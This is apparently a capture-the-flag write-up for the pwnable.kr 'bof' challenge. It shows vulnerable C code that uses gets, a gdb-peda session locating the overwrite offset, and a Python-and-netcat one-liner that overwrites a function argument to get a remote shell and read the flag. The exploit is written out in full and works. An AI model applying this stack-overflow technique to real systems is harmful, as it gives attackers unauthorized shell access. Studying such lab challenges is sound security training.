### bof

* Source code

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```


* Solution

```
gdb-peda$ disasss main
Undefined command: "disasss".  Try "help".
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000068a <+0>:	push   ebp
   0x0000068b <+1>:	mov    ebp,esp
   0x0000068d <+3>:	and    esp,0xfffffff0
   0x00000690 <+6>:	sub    esp,0x10
   0x00000693 <+9>:	mov    DWORD PTR [esp],0xdeadbeef
   0x0000069a <+16>:	call   0x62c <func>
   0x0000069f <+21>:	mov    eax,0x0
   0x000006a4 <+26>:	leave  
   0x000006a5 <+27>:	ret    
End of assembler dump.
gdb-peda$ disass func
Dump of assembler code for function func:
   0x0000062c <+0>:	push   ebp
   0x0000062d <+1>:	mov    ebp,esp
   0x0000062f <+3>:	sub    esp,0x48
   0x00000632 <+6>:	mov    eax,gs:0x14
   0x00000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x0000063b <+15>:	xor    eax,eax
   0x0000063d <+17>:	mov    DWORD PTR [esp],0x78c
   0x00000644 <+24>:	call   0x645 <func+25>
   0x00000649 <+29>:	lea    eax,[ebp-0x2c]
   0x0000064c <+32>:	mov    DWORD PTR [esp],eax
   0x0000064f <+35>:	call   0x650 <func+36>
   0x00000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x0000065b <+47>:	jne    0x66b <func+63>
   0x0000065d <+49>:	mov    DWORD PTR [esp],0x79b
   0x00000664 <+56>:	call   0x665 <func+57>
   0x00000669 <+61>:	jmp    0x677 <func+75>
   0x0000066b <+63>:	mov    DWORD PTR [esp],0x7a3
   0x00000672 <+70>:	call   0x673 <func+71>
   0x00000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0000067a <+78>:	xor    eax,DWORD PTR gs:0x14
   0x00000681 <+85>:	je     0x688 <func+92>
   0x00000683 <+87>:	call   0x684 <func+88>
   0x00000688 <+92>:	leave  
   0x00000689 <+93>:	ret    
End of assembler dump.
gdb-peda$ b *func+40
Breakpoint 1 at 0x654
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ run     
Starting program: /home/eloi/pwnable/bof 
overflow me : 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

[----------------------------------registers-----------------------------------]
EAX: 0xffffd2bc ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EBX: 0x0 
ECX: 0xf7fb15a0 --> 0xfbad2288 
EDX: 0xf7fb287c --> 0x0 
ESI: 0xf7fb1000 --> 0x1b1db0 
EDI: 0xf7fb1000 --> 0x1b1db0 
EBP: 0xffffd2e8 ("AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
ESP: 0xffffd2a0 --> 0xffffd2bc ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x56555654 (<func+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555649 <func+29>:	lea    eax,[ebp-0x2c]
   0x5655564c <func+32>:	mov    DWORD PTR [esp],eax
   0x5655564f <func+35>:	call   0xf7e5e3e0 <_IO_gets>
=> 0x56555654 <func+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <func+47>:	jne    0x5655566b <func+63>
   0x5655565d <func+49>:	mov    DWORD PTR [esp],0x5655579b
   0x56555664 <func+56>:	call   0xf7e39da0 <__libc_system>
   0x56555669 <func+61>:	jmp    0x56555677 <func+75>
[------------------------------------stack-------------------------------------]
0000| 0xffffd2a0 --> 0xffffd2bc ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffd2a4 --> 0xffffd344 --> 0x91706e55 
0008| 0xffffd2a8 --> 0xf7fb1000 --> 0x1b1db0 
0012| 0xffffd2ac --> 0x5f17 
0016| 0xffffd2b0 --> 0xffffffff 
0020| 0xffffd2b4 --> 0x2f ('/')
0024| 0xffffd2b8 --> 0xf7e0bdc8 --> 0x2b76 ('v+')
0028| 0xffffd2bc ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x56555654 in func ()
gdb-peda$ x/10x $ebp+0x8
0xffffd2f0:	0x41474141	0x41416341	0x48414132	0x41644141
0xffffd300:	0x41413341	0x65414149	0x41344141	0x41414a41
0xffffd310:	0x35414166	0x414b4141
gdb-peda$ pattern offset 0x41474141
1095188801 found at offset: 52
gdb-peda$ quit
eloi@null2root-ubuntu:~/pwnable$ (python -c "print 'A'*52 + '\xbe\xba\xfe\xca'";cat)| nc pwnable.kr 9000
whoami
bof
ls
bof
bof.c
flag
log
log2
super.pl
cat flag
daddy, I just pwned a buFFer :)
exit
*** stack smashing detected ***: /home/bof/bof terminated
overflow me : 

eloi@null2root-ubuntu:~/pwnable$ 

```
